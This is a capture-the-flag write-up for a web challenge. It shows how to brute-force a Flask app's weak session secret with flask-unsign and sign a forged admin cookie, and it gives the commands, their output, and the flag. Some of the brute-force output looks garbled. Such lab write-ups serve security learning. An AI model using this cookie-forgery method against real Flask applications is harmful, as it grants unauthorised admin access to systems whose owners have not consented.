> # Web - Flask Admin
> > Web - 150pts
>
> The flag is reserved for only those who know the `secret_key`!

## Writeup
The webpage states that we have to be admin to get the flag. From the challenge name we can assume that it is hosted with `flask`.

If we look at our cookies we can see that a session is set for us. The token can be decoded with for example [jwt.io](jwt.io), where we will see that the contents of the cookie is `admin: False`.

Flask sessions are signed with a `secret_key`, but if this secret key is weak anyone can change the contents of their cookie. We can try to bruteforce what the secret key is with [flask-unsign](https://github.com/Paradoxis/Flask-Unsign).

After downloading the tool we can run the following command to find the secret key:
```console
$ flask-unsign --unsign --cookie <your_cookie>
[*] Session decodes to: {'admin': False}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (1920): -----BEGIN PRIVATE KEY-----ECR
[+] Found secret key after 13184 attemptsxxxxxxxxxxxx
'abc123'
```

Knowing that the secret key is `abc123` we can forge the cookie to contain `admin: True`.
```console
$ flask-unsign --sign --cookie "{'admin': True}" --secret "abc123"
eyJhZG1pbiI6dHJ1ZX0.Zb4OoQ.5_xOuoHmBFZ7RDM4-adpHzLOjAo
```

By changing the cookie in our browser to this new one we will be able to see the flag.
```
TD{fr33_4dm1n_f0r_3v3ry0ne}
```
